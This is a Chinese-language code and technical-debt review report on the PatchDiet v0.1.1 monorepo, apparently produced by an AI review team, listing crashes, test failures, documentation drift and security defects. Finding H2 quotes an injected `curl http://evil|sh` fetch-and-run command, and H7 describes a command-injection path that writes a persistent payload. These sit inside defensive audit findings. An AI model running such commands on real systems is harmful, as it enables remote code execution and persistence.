# PatchDiet v0.1.1 全面工程审查报告

**日期**：2026-09-25
**工作流**：工作流 1（综合代码审查）+ 工作流 5（技术债评估）组合 —— 覆盖架构设计、代码质量与技术债务、安全性、性能与可扩展性、可靠性（容错/数据保护/可观测性）、部署运维、测试保障、文档一致性
**参与成员**：Cody（代码审查）/ Archi（架构）/ Rex（SRE）/ Tessa（测试）/ Docu（文档）
**审查对象**：D:\systemDir\Desktop\PatchDiet（TypeScript ESM monorepo，npm workspaces：packages/{core,report,cli,action,github-app} + demo + extensions/vscode-patchdiet；vitest；tsc + esbuild）

> 事故响应流程（工作流 3）本次未启动：当前无活跃生产事故与告警数据。所有"已实测复现"结论均由成员在本仓库实际运行命令验证。

---

## 📌 TL;DR（执行摘要）

- **整体结论：🔴 不通过（红基线）**。PatchDiet 的核心引擎分层与安全功底显著高于 0.1.x 平均线（git 全走 execFile 零拼接、demo SSRF 防护完整、trusted publishing 正确、CI 有 dist 幂等校验），但当前快照处于"工具在自家仓库无法运行、测试套件 71.5% 失败、对外文档大面积宣传未实现功能"的自举崩坏状态。演示可用 ≠ 工程健全。
- 严重度分布：🔴严重 5 项 / 🟠高 8 项 / 🟡中 8 项 / 🟢低 4 项（由 5 位成员约 60 条原始发现去重合并而来，多源独立确认的条目已标注）。
- **阻塞项 5 个（全部 🔴）**：配置自举崩溃（实测 check/doctor 崩）、幽灵模块源码丢失（实测 npm test 必败）、测试基线崩坏（113/158 失败）、文档-契约-实现三方脱节、README 幽灵脚本。修复前不应发布、不应对外宣传 README 能力清单。
- 非阻塞项中最重要的两类：生产门槛（webhook 验签、命令执行信任边界）与产品效力缺口（diff 解析边界、缓存键、性能模型）。

---

## 🎯 核心结论卡片

| 项目 | 内容 |
|------|------|
| 整体评级 | 🔴 不通过（红基线；核心引擎 β 级可保留，分发面与治理 α 级需重建） |
| 阻塞项数量 | 5（S1–S5，均为发布/对外宣传的硬门槛） |
| 关键行动项 | 7 条（见行动清单，P0×3 / P1×3 / P2×1） |
| 最快翻红路径 | 先修 Windows 测试基础设施竞态（约半天，救回 36 个核心安全测试）→ 恢复幽灵模块源码 → config 自举修复 → 测试基线重定全绿 |
| 交叉验证 | 与同日 gstack 预上线检查（deliverables/gstack/pre-launch-check-patchdiet-2026-09-25.md）的 source↔dist 分歧、VSCode diffCommand 注入、SHA 未钉等结论相互印证 |

---

## 🔍 审查发现（去重合并，按严重度排序）

### 🔴 严重（阻塞级，5 项）

| # | 问题 | 关键证据（文件:行） | 影响与攻击场景 | 建议修复 | 来源 |
|---|------|---------------------|----------------|----------|------|
| S1 | **配置自举崩溃**：校验器 KNOWN_KEYS 不含 `version/safety/intelligence/performance`，而项目自带 patchdiet.yaml:1,13-20 恰含这些键；init 模板（cli/index.ts:34）写入 `version: 1` 同样被拒 | config.ts:43-49；patchdiet.yaml:1,13-20。**实测复现**：`node dist/packages/cli/src/index.js check` → "Invalid patchdiet.yaml: unknown config key '.version'/'.safety'..." | 工具在自家仓库 check/shrink/doctor 全部崩溃；照抄示例/文档的新用户 init 后第一天必崩（100% 复现）；README 宣传的 safety.allow_upload、intelligence.mode、performance.* 配置在核心实现中根本不存在（行为不可配置） | KNOWN_KEYS 补齐 4 键并实现（或先删根 yaml 非法段 + init 模板同步）；加"init 产物可通过校验"自举 CI 测试 | Cody ✓实测 / Archi / Rex ✓实测 / Docu ✓实测 / Tessa（5 源确认） |
| S2 | **幽灵模块（源码丢失）**：insights.ts、pro.ts、symbols.ts 源文件不存在，但 3 个单测、VSCode 扩展（extension.mjs:7-8）、2 个脚本运行时 import 其陈旧 dist 产物 | tests/unit/{insights,pro,symbols}.test.ts；scripts/create-case-study.mjs:6-10。**实测复现**：`npx vitest run tests/unit/insights.test.ts` → "Failed to load url .../insights.js" | 全新 clone + build 后 `npm test` 必失败；VSCode 扩展激活即崩；dist 中的孤儿产物成为"隐藏源码"，构建不可复现；npm files 白名单会把源里不存在的模块发布出去 | 从 git 历史恢复三个 .ts 源码（首选），或将测试/扩展/脚本迁移到 demo/insights.mjs 独立实现并清除陈旧 dist；CI 加 clean-build 幂等校验 | Cody ✓实测 / Archi / Tessa（3 源确认） |
| S3 | **测试基线崩坏**：158 个测试 113 个失败（71.5%）；unit 54/71、e2e 60/87。shrink-safety.test.ts 36/44 失败纯因测试基础设施（`Promise.all` 并发 git init 竞态 + Windows EBUSY 清理失败），**核心安全测试从未执行过断言** | tests/unit/shrink-safety.test.ts:34-39（initGitRepo 竞态）；实测 unit ~14s、e2e 268s。根因：测试为更大的规划版本而写（monorepo 按路径测试命令、持久化缓存、--apply-removals、diet-card API 等），当前源码是缩减后的 v0.1.1 | 整个质量信号失效，CI 无法作为回归防线；ci.yml（ubuntu+windows 双 job）当前必红；工具核心承诺（测试验证后才删除）在 Windows 上无测试守护 | ① 先修 Windows 基础设施（改串行 init + 重试清理，约半天救回 36 个测试，性价比最高）；② 以 v0.1.1 现状重定测试基线：删除或 skip 待实现部分，恢复全绿；③ 对照 create-example-repo.ts 的串行写法修复竞态 | Tessa ✓实测 |
| S4 | **文档-契约-实现三方脱节**：`patchdiet card` 命令与 diet-card 产物零实现（cli 仅注册 init/check/shrink/doctor/report，--help 实测确认）；reduced.patch/removal.patch/candidates.json 不存在（实际产物是 cleanup.diff，shrink.ts:145，且 README 未记载）；action.yml 声明 9 个 outputs 实际只写 5 个；README 命令表 24 条中 4 条不可用（--apply-removals/--intelligence/--max-parallel-worktrees）；quickstart.md:83 反称"--apply 已弃用"与代码完全相反 | README.md:97-107,153-170,232-237；action.yml:26-35 vs packages/action/index.mjs:73-85；.github/workflows/patchdiet-pr.yml:34-36 上传不存在产物 | 用户照 README/quickstart 操作全部落空；CI 下游消费 `${{ steps.*.outputs.diet-card }}` 得空串；"可分享 Diet Card 回执"是空头支票 | 统一对账三选一：实现（card/candidates.json/双 patch）或降级为 roadmap 或删除；修正 README 命令表与产物清单；action.yml outputs 收敛为实际 5 个；CI 加"声明 outputs = writeOutputs 键"一致性测试 | Docu / Cody / Archi / Rex / Tessa（5 源确认） |
| S5 | **README 幽灵脚本**：`npm run demo`、`npm run pro:readiness`、`npm run github-app:dev` 三个脚本在根 package.json 均未注册（底层脚本文件存在：scripts/serve-demo.mjs、generate-pro-readiness.mjs、github-app-smoke.mjs）；benchmark.yml:16-17 引用 `bench:examples`/`pro:readiness` 同样不存在 | package.json:30-41（scripts 仅 build/build:action/demo:build/test*/typecheck）；demo/package.json 无 scripts | README 首屏与 Hackathon Demo Path 第一步即失败（missing script）；benchmark 工作流手动触发必失败 | 在根 package.json 注册 3 个脚本指向现有底层脚本（成本极低，半小时内）；benchmark.yml 同步修复 | Docu / Tessa / Rex（3 源确认） |

### 🟠 高（8 项）

| # | 问题 | 关键证据（文件:行） | 影响 | 建议修复 | 来源 |
|---|------|---------------------|------|----------|------|
| H1 | **GitHub App webhook 安全缺陷群**：① secret 未配置时 `signatureMatches` 直接放行（fail-open）；② HMAC 对 `JSON.stringify(body)` 重序列化串验签而非原始字节（键序/空格差异 → 合法投递全被 401）；③ 未用 timingSafeEqual；④ jobs Map 无上限无 TTL（每条含 ≤1MB body）+ GET /jobs/:id 无鉴权（信息泄露 + 内存 DoS）；⑤ deliveryId/事件类型从 body 取而非 `x-github-delivery`/`x-github-event` 头（可伪造） | server.mjs:44-47, 60, 70, 72, 106-113, 116-124, 117-123（死变量 signatureBody） | 骨架期无害；接生产即事故：配了 secret 收不到任何事件、忘配 secret 任何人可伪造 PR 事件 | 缓存原始 body Buffer 后再解析+验签（timingSafeEqual）；secret 缺失拒绝启动或 503；jobs 加上限+TTL；从 header 取 delivery/event 并白名单事件类型；补签名单测（原文体/键序重排/篡改） | Cody / Archi / Tessa / Rex（4 源确认） |
| H2 | **命令执行信任边界缺失**：required 命令来自被测仓库的 patchdiet.yaml/package.json，经 `exec` shell 执行，无信任边界标注或防护 | runner.ts:9；action/index.mjs:18（从 PR checkout 读配置） | fork PR 修改 patchdiet.yaml 注入 `curl http://evil\|sh` → 在 Action runner 以工作流身份执行任意代码。现用 pull_request+只读 token 缓解爆炸半径；一旦复用进 pull_request_target 即成秘密外泄通道；本地场景=运行 PR 即 RCE | 文档明确标注信任边界；Action 增加 trust 模式；patchdiet.yaml 出现在 PR diff 时显著告警或要求确认；长期命令白名单/确认机制 | Cody |
| H3 | **候选缓存键缺陷**：LRU key=`filePath:hunkIndex`，无 patch 内容哈希、无 commit 上下文，模块级单例 TTL 30min | shrink.ts:59, 325 | 长驻进程（GitHub App 处理多 PR）跨 PR/commit 时同 key 命中**陈旧 verdict** → 未经测试验证的 hunk 可能被判 removed 并写入 cleanup.diff，违背"测试验证后才删除"的核心安全承诺；单次运行内 key 不重复 → 永不命中（死代码）；CACHE HIT 日志直写 stdout 破坏 --json | cacheKey 纳入 SHA256(patch 内容)+headRef；verdict 缓存绑定单次 runShrink（除非显式开启持久缓存）；日志走 stderr；补跨 run 陈旧命中测试 | Cody / Tessa / Archi（3 源确认） |
| H4 | **diff 解析边界缺陷群**：① `+++ /dev/null` 删除文件整个静默丢弃（不评估、不进报告）；② 纯 rename 静默丢弃；③ 带引号 unicode/空格路径（core.quotepath 默认开启）不匹配任何 regex → 静默跳过；④ CRLF 的 \r 被剥离；⑤ `\ No newline at end of file` 被当 context 且回写损坏；⑥ 内容行恰为 `--- a/x` 被误判为文件头截断 hunk；⑦ serialize 丢失 new file mode/rename 头 → 反向 apply 必败 | diff.ts:22-36, 132-142；shrink.ts:465-497；Tessa 表驱动核实 | AI PR 中删除文件是高频操作——这些变更从报告中消失，用户误以为全量评估过；中文/带空格文件名 PR 大部分不可见或退化为 needs-human-review（方向保守不致误删，但工具效力大打折扣） | 按字节处理 diff、保留扩展头（mode/rename/no-newline）；`+++ /dev/null` 用 pendingOldPath 建 entry 标记 deleted；quoted 路径按 git 八进制转义解码；parse↔serialize 往返对等测试 + 边界表驱动用例 | Cody / Tessa / Archi（3 源确认） |
| H5 | **worktree 生命周期容错缺口**：① 无 SIGINT/SIGTERM handler → Ctrl+C/kill 后 eval worktree 与 .git/worktrees 元数据泄漏；② 残留 worktree 使 `git worktree add` 失败且异常直接传播 → runShrink 整体中断（持续失败循环），finally 兜底只删目录不 prune；③ createBranch worktree 时间戳命名永不 GC；④ eval/*.diff 产物只增不删 | shrink.ts:336-341, 376-384, 206-223, 357 | 一次脏退出后同仓库后续 shrink 在相同 hunk 处反复崩溃直到用户手动 prune；磁盘与 git 元数据持续膨胀 | finally 兜底追加 `git worktree prune`；add 失败先 prune 再重试一次并给出可行动错误信息；注册 SIGINT/SIGTERM/beforeExit 统一清理；运行前清理 7 天以上旧 worktree；run 结束清理 eval/*.diff | Rex / Cody / Tessa（3 源确认） |
| H6 | **runner 缺陷群**：① exec/execFileAsync 未设 maxBuffer（默认 1MB）→ 大 diff 或 verbose 测试输出崩溃/exitCode 误报 1（基线假失败 → 候选全 kept，fail-safe 但不可解释）；② Unix 超时仅 SIGTERM 杀直接子进程（不杀 npm/vitest 孙进程树；Windows taskkill /T 正确）→ 僵尸进程污染后续候选验证；③ 测试输出黑洞：stdout/stderr 全捕获从不透出，verdict reason 只有 "failed after reverting this hunk" | runner.ts:9, 24-33；git.ts:15-19；shrink.ts:363；runner.test.ts:23 已写 multi-megabyte 测试但实现缺失 | 大 PR（几百文件）直接不可用；超时后命令实际还在跑；kept 原因无法诊断 | 显式 maxBuffer（如 32MB）+ 区分"输出溢出"；`detached:true` + `process.kill(-pid)` 进程组或 tree-kill；透出测试 stderr 尾部 N 行到报告 | Cody / Rex / Tessa（3 源确认） |
| H7 | **VSCode 扩展三重缺陷**：① 动态 import 仓库根陈旧 dist（且恰是幽灵模块 insights.js），vsix 打包后 `../../` 相对路径逃出扩展根；② `execFile("patchdiet")` 在 Windows 触发 Node≥18.20 的 EINVAL（.cmd shim）；③ diffCommand 校验为黑名单（不拒 `>` `<` 引号）+ `shell:true` 执行 → 受信任工作区打开恶意仓库，经 .vscode/settings.json 可任意路径写文件（重定向到 Startup 目录持久化） | extension.mjs:7-8, 92-102, 117-127, 133-145 | 扩展仅在"恰好有旧 dist 的开发机"能跑；Windows 用户必失败；恶意仓库可通过扩展写持久化载荷 | 构建期 esbuild 内联 core 源码输出自包含 extension.js；Windows spawn 加 shell 或解析完整路径；diffCommand 改白名单（`^git diff(\s+[\w./-]+)*$`）或固定 execFile("git",["diff",base+"..."+head]) | Archi / Cody（2 源确认） |
| H8 | **配置静默失效 + 性能模型失真**：① report.html/markdown/github_comment、scope.allow_format_only_removal/flag_dependency_bumps 被校验但加载时硬编码取默认值（配置不生效）；② language/strategy/atom_granularity 只存不用；③ max_runtime_minutes 在 shrink.ts **零引用**（无全局预算），实际语义是"每命令每候选"超时；④ max_parallel_worktrees 配置零消费，逐候选串行 O(N×T) | config.ts:273-297；shrink.ts:91, 387-422；Tessa 核实 max_runtime_minutes 零引用 | 关闭 HTML 报告仍生成（违背"never silently applies an invalid configuration"的项目自述）；500-hunk PR × 60s 测试 ≈ 8h——产品对目标场景（AI 大 PR）实际不可用 | 接线或移出 schema（与 S1 合并执行）；引入 runShrink 级全局 deadline；实现 worktree 池消费既有配置；文档明示适用规模上限（≤50 hunks）作为短期兜底 | Archi / Cody / Tessa / Rex（4 源确认） |

### 🟡 中（8 项）

| # | 问题 | 关键证据 | 影响 | 建议 | 来源 |
|---|------|----------|------|------|------|
| M1 | **模块边界架构债**：core↔report 源码级循环依赖（shrink.ts:7 ↔ report/index.ts:1）；跨包全部 `../../<pkg>/src` 相对导入，cli/package.json 未声明任何依赖（workspace 契约架空）；@patchdiet/cli 自带死 bin；根 0.1.1 vs 子包 0.1.0 版本不同步；github-app 无 package.json | shrink.ts:7；cli/index.ts:9-14；action/index.mjs:6-8 | 引擎与展示耦合，@patchdiet/core 无法独立发布；依赖图不可验证；发布语义只有"根单包整体"一条路且靠相对路径在 dist 中恰好成立 | ADR-1：渲染职责上移宿主层，引擎只返回数据；ADR-2：改 `@patchdiet/core` 包名导入 + tsc project references；删除死 bin；版本对齐脚本 | Archi / Cody |
| M2 | **dry-run 与正式运行系统性不一致**：dry-run 的 eval worktree 在系统 tmpdir（向上无 node_modules → requiredCommands 失败 → 候选误判 kept）；正式运行靠"恰好命中项目 node_modules"的隐式耦合；基线跑 dirty cwd vs 候选跑干净 headRef worktree（verdict 失真无提示） | shrink.ts:91, 97-99 | dry-run 结果误导用户；有未提交改动时基线与候选基于不同内容 | eval root 固定在 target cwd 内（dry-run 亦然）；运行前 dirty 检查并告警（doctor 有、shrink 主流程无）；补 dry-run 一致性 e2e | Archi / Cody |
| M3 | **缺最终组合验证**：每个 hunk 独立"逆向应用+全量测试"，但最终 cleanup.diff（全部 removals 组合）从未整体复验——单 hunk 各自通过 ≠ 组合通过 | shrink.ts:88-243 | 相互依赖的删除组合可能坏；apply 后坏 patch 风险；产品核心承诺对组合场景存在缺口 | 生成 cleanup.diff 后对最终 kept 集合做一次整体反向应用+全量测试，失败降级 kept-only 并在报告标注（ADR-5） | Archi |
| M4 | **GitHub App provider / demo 功能缺陷**：getPullRequestDiff 不带 Authorization 且不查 response.ok（私有库必败、60 req/h 限流、404 HTML 被当 diff）；demo ALLOWED_REPOS 空集 → /api/pr 对任何 URL 一律 400（README 宣传能力不可用）；readResponseTextWithLimit 先全量入内存再查 2MB 上限 | github-provider.mjs:26-35；demo-server-lib.mjs:65-68, 114-121 | App 骨架核心链路不可用；demo 对外宣传的 PR URL 抓取坏死；超大 PR 内存放大 | 复用 request()（token+ok 检查）；allowlist 改配置驱动 + UI 提示受限；流式读取按字节截断 | Cody / Tessa |
| M5 | **CHANGELOG/版本治理**：v0.1.1 tag 已存在但 doctor/零配置检测/--dry-run 等主功能记在 Unreleased；README Action ref `@v0.1.1` 描述能力超过任何已发布版本 | CHANGELOG.md:3-19 vs git tag | 无法判断已发布 0.1.1 究竟含哪些功能；对外引用混乱 | 已实现条目归入 0.1.1 或发 0.1.2 并同步 README ref 与 CHANGELOG | Docu / Archi |
| M6 | **docs 结构债**：59 个 md 无索引；README 不链接 quickstart/troubleshooting/config/safety（孤岛）；路线图×6、安全×4、发布×8 主题重复并存（roadmap.md 停留在计划态、issues.md 4 条中 3 条已实现）；docs/superpowers/ 内部 AI 开发计划混入公开文档；CLI 退出码无文档；架构文档缺失（README 声称有 architecture notes 实际只有 algorithm.md） | docs/ 全目录实测 | 新用户路径断裂；读者无法判断哪份权威；过时文档矛盾随时间放大 | 加 docs/README.md 索引；README 关键段落链接操作文档；每主题单一权威其余归档 archive/；补退出码表 + 一页架构总览 | Docu |
| M7 | **CI 供应链与发布卫生**：actions/checkout@v4 等全部 tag 引用未 pin SHA（发布工作流持 id-token:write，tag 劫持即 RCE，风险放大）；无 engines 声明 Node>=20（commander 14 要求）；无 prepublishOnly（本地 publish 会用 stale dist）；无 --provenance；无依赖审计通道（仅 commander+yaml 两依赖，面小但零护栏） | .github/workflows/*.yml；package.json | 供应链单点；node18 用户安装后不明崩溃；本地发布旧代码 | pin 到 commit SHA；加 engines + prepublishOnly: build && typecheck && test:fast；可选 --provenance；dependabot/renovate + npm audit 门禁 | Rex / Cody / Tessa |
| M8 | **测试缺口群**：retry_flaky_tests 对一切失败（非仅 flaky）重试且路径零直接测试；CLI 错误仅 process.exitCode=1 无失败路径测试；config ~120 行校验分支仅 3 个 happy 用例；shrink 后 .patchdiet 是否被 git 追踪未测（可能污染下次 diff） | cli/index.ts:225-228；config.ts:132-255 | 重试语义回归不可见；CI/脚本无法按退出码分支处理 | mock runCommand 测 attempts/超时抛错；子进程断言 exit code + stderr；校验表驱动测试 + 配置回读断言 | Tessa / Cody |

### 🟢 低（4 项）

| # | 问题 | 关键证据 | 建议 | 来源 |
|---|------|----------|------|------|
| L1 | 零散代码卫生：markdown 报告反引号/换行未转义（恶意文件名可在 GitHub 评论注入钓鱼链接）；glob `?` 未转义、中间 `**` 语义错误（ignorePaths 误匹配）；github-provider c.body 未判空；仓库根 `nul` 文件（Git Bash 误执行 cmd 语法残留，未入库，实测破坏 ripgrep 等本地工具链） | report/index.ts:107,116；shrink.ts:613-630；github-provider.mjs:56-57；./nul | markdown 上下文转义；glob 表驱动单测（`?`→`[^/]`）；body 判空；删除 nul + .gitignore 加 `nul` + 审计本地脚本 cmd 语法 | Cody / Archi |
| L2 | github-app 模板缺失 + 死代码双轨：无 .env.example/manifest 模板（README 声称有）；server.mjs 内联 job 逻辑与 jobs.mjs PreviewJobQueue 并存，run 闭包从不被调用 | packages/github-app/ 实测 | 补模板或 docs 内联；合并为队列模块 | Docu / Cody |
| L3 | 测试目录语义漂移：e2e 混入 release-readiness/pro-readiness 等发布检查、unit 含 demo-motion 等演示测试、幽灵模块测试并存 | tests/ 结构 | 按"被测对象"重组：packages 测试 vs demo 测试 vs release 门禁 | Archi |
| L4 | run.json 审计字段缺失：无 startedAt/finishedAt、PatchDiet 版本、commit SHA、原始命令行参数 | types.ts:65-81 | 补 5 个审计字段，事后可回答"哪个版本、哪个 commit、何时跑的" | Rex |

### ✅ 做得好的地方（各成员独立确认，保留为资产）

- **git 交互零 shell 拼接**：全库 execFile+参数数组，git 命令注入面控制到位（Cody）
- **demo SSRF 防护完整**：host 钉死 github.com + encodeURIComponent + 15s 超时 + 白名单根防穿越；github-app/demo 只绑 127.0.0.1；readJson 1MB 上限（Cody）
- **HTML 输出全量 escapeHtml**；.gitignore 覆盖 dist/.patchdiet/.env/*.pem（Cody/Archi）
- **dist 未入库**（.gitignore 覆盖，git ls-files 核实为 0）；action bundle 入库 + CI `git diff --exit-code` 幂等校验是正确范式（Archi）
- **trusted publishing 配置正确**（id-token: write、无 NPM_TOKEN、发布前 build+typecheck+test）（Rex）
- **CI 有 Windows 矩阵 + 70% 覆盖率阈值（结构上）+ dist 新鲜度校验**；PR 评论幂等 PATCH（Rex/Tessa）
- **Windows 兼容意识**：taskkill /T /F 进程树、路径分类统一、forceConsistentCasingInFileNames（Archi/Cody）
- **测试投入量级可观**：unit 12 + e2e 13 共 6793 行（Archi）——问题在基线错位而非投入不足

---

## 🏗️ 架构影响评估（Archi · ADR 摘要）

| ADR | 决策 | 要点 |
|-----|------|------|
| ADR-1 | 消除 core↔report 环 | 领域类型留 core，渲染调用上移 cli/action；引擎不渲染是可复用前提 |
| ADR-2 | 相对源码导入 → 包名导入 | `@patchdiet/core` + project references；依赖显式化后 CI 可校验 |
| ADR-3 | 产物治理与可复现构建 | TS 产物不入库并从工作区清除；扩展构建期内联 core；CI 加 clean-build 幂等校验 |
| ADR-4 | 配置治理 | version 入白名单+迁移钩子；未实现消费的键接线或移出 schema；配置是公共 API，需与代码同版本演进 |
| ADR-5 | 验证闭环与 diff 保真 | cleanup.diff 整体复验（失败降级 kept-only）；diff 模型携带 mode/rename/no-newline 元数据 + 往返对等测试 |
| ADR-6 | host-adapter 下沉 | base ref 解析链/测试命令探测下沉 core；action.yml outputs 与实现对账 |
| ADR-7 | 执行模型可扩展化 | worktree 池并行消费既有配置；全局预算字段与单命令超时区分；候选静态分层先批量裁定 |

**成熟度判断**：核心引擎 β 级（可运行、有测试护栏、纯函数分层是资产）；分发面与多宿主治理 α 级（演示可用、工程脆弱）。按 Priority ≥ 28 的前 6 项处置后，可从"演示级 monorepo"过渡到"可发布的多宿主产品"。

---

## 🧪 测试覆盖评估（Tessa）

- **实测结果**：unit 54 失败/17 通过（~14s）；e2e 60 失败/27 通过（268s）；合计 **113/158 失败（71.5%）**。test:heavy 按指示跳过。
- **覆盖率不可信**：失败时不产出报告；`coverage.include` 不生效（被 demo/extensions/scripts 淹没）；v8 remapping 严重失真（config.ts 实际执行却报 4.28%/0%）——**ci.yml 的 70% 阈值从未真正守护过任何东西**。
- **失败根因三类**：引用不存在模块（收集即败）/ 引用不存在 API（diet-card、runner-detailed 等）/ Windows 测试基础设施缺陷（36 个核心安全测试从未执行断言）。
- **CI 评估**：ci.yml 结构良好但当前必红；publish-npm.yml trusted publishing 正确但无 CI 绿灯 gate；benchmark.yml 死脚本；patchdiet-pr.yml 上传不存在产物；Node 版本三处不统一（action=node20/CI=node22/publish=node24）。

## 🔧 可靠性与部署运维（Rex 摘要）

- **通过项**：trusted publishing、dist 新鲜度校验、PR 评论幂等、"not a semantic-equivalence proof" 三处明示、ignore_paths/test 文件默认保护。
- **容错缺口**：无 signal handler（H5）、Unix 进程树不杀（H6）、`--apply` 无 `git apply --check` 预检与 dirty 校验（工作区被不可预期修改）、无全局预算（H8）。
- **可观测性**：测试输出黑洞（H6）、run.json 缺审计字段（L4）、无日志分级、--json 契约脆弱。
- **部署三清单**：npm 发布（trusted publishing ✅ / engines ❌ / prepublishOnly ❌ / provenance ❌）；GitHub Action（entry 一致 ✅ / 幽灵 outputs ❌ / node20 弃用周期 ⚠️ / SHA 未钉 ❌）；GitHub App 骨架（无 Dockerfile/进程管理，骨架期可接受）。

---

## ✅ 行动清单（按优先级排序）

| # | 行动 | 负责角色 | 紧急度 | 预期完成 |
|---|------|---------|--------|---------|
| 1 | **恢复红基线第一步**：修复 shrink-safety 测试基础设施（git init 改串行 + Windows EBUSY 重试清理），救回 36 个核心安全测试 | 工程负责人（参考 Tessa 方案，对照 tests/e2e/helpers/create-example-repo.ts 串行写法） | P0 | 半天 |
| 2 | **恢复幽灵模块源码**（git 历史找回 insights.ts/pro.ts/symbols.ts）或裁撤全部下游引用；清除陈旧 dist 与 nul；以 v0.1.1 现状重定测试基线至全绿（删除/skip 规划版 API 的测试） | 工程负责人 | P0 | 1 天 |
| 3 | **config 自举修复**：KNOWN_KEYS 补 version/safety/intelligence/performance 并接线或删根 yaml 非法段；init 模板与校验器联动自举测试 | 工程负责人 | P0 | 0.5 天 |
| 4 | **文档-契约对账**：注册 demo/pro:readiness/github-app:dev 三个脚本；README/action.yml/quickstart 与实现对齐（card/reduced.patch 等降级 roadmap 或实现；修正命令表与产物清单）；CHANGELOG 归位 | 工程负责人 + Docu | P0 | 1 天 |
| 5 | **webhook 验签重做**：原始 body Buffer + timingSafeEqual + secret 缺失拒绝启动 + jobs 上限/TTL/鉴权 + header 取 delivery/event | 后端开发 | P1 | 1 天 |
| 6 | **引擎可靠性批次**：缓存键加 SHA256(patch)+headRef；runner maxBuffer + Unix 进程树 kill + stderr 透出；diff 解析边界修复（/dev/null、rename、quoted、CRLF、`--- a/` 内容行）+ worktree prune 自愈 + signal handler + `--apply` 预检 | 后端开发 | P1 | 2-3 天 |
| 7 | **治理批次**：CI SHA pin、engines/prepublishOnly、dependabot、coverage 管道修复（include/失败抑制/remapping）、docs 索引 + 退出码/架构文档、信任边界文档 | 工程负责人 + Docu + Rex | P2 | 2 天 |

**投入产出预估**：P0 全部 ≈ 3 人天（解除发布阻断 + 恢复质量信号）；P1 ≈ 4 人天（生产门槛 + 产品效力）；P2 ≈ 2 人天（治理收口）。两周期内可从🔴红基线转入🟡可发布候选。

---

## ⚠️ 待完善 / 已知局限

- test:heavy 未运行（按审查指示跳过）；e2e 13 个失败文件中 4 个未逐一确认名单。
- Rex 未逐行审计 packages/github-app 5 个模块、demo 服务器细节、extensions/；H1 相关问题以 Cody/Tessa 的读码结论为准。
- 覆盖率数字不可信（工具链失真），未在报告中引用任何覆盖率百分比。
- 审查基于当前工作区快照（含 99 条未提交变更），结论可能随代码演进失效；行号以审查时刻为准。
- 个别合并条目的最终严重度为主理人裁量（多成员评级不一致时取高并保留全部来源，如 H1 骨架期实际风险低于评级）。
- 与同日 gstack 预上线检查（deliverables/gstack/pre-launch-check-patchdiet-2026-09-25.md）结论交叉印证：source↔dist 分歧、VSCode diffCommand 注入、SHA 未钉、缓存无上限、超时耦合等两轮独立复现，可信度高。

---

## 📚 数据来源 & 成员产出索引

- **Cody（代码审查师）**：2🔴/6🟠/15🟡/5🟢 + 架构债/依赖债/代码债评分表；2 项🔴实测复现（config check 崩溃、insights.test 收集失败）。
- **Archi（架构师）**：16 项架构发现 + 13 项债 Priority 排序 + 7 条 ADR；核实 dist/nul 未入库、99 条未提交变更、typecheck 必失败。
- **Rex（SRE 工程师）**：19 项可靠性/部署发现（2🔴/6🟠/6🟡/3🟢通过 + 2 项实测通过项）；实测复现 config 加载崩溃；三张部署检查清单。
- **Tessa（测试专家）**：实测运行 unit/e2e 全量（113/158 失败明细 + 根因三类定性）；12 项覆盖缺口（对照源码核实）；CI 五工作流评估；测试债 P0-P3 排序（最高 Priority 80）。
- **Docu（技术文档师）**：11 项文档债（D1-D11，3🔴）+ 已核实一致项白名单；实测 CLI --help 与 check 崩溃验证。
- 交叉参考：deliverables/gstack/pre-launch-check-patchdiet-2026-09-25.md（同日早前独立检查）。

---

> 本报告由工程保障团队 AI 协作生成，关键决策请由人类工程负责人复核。
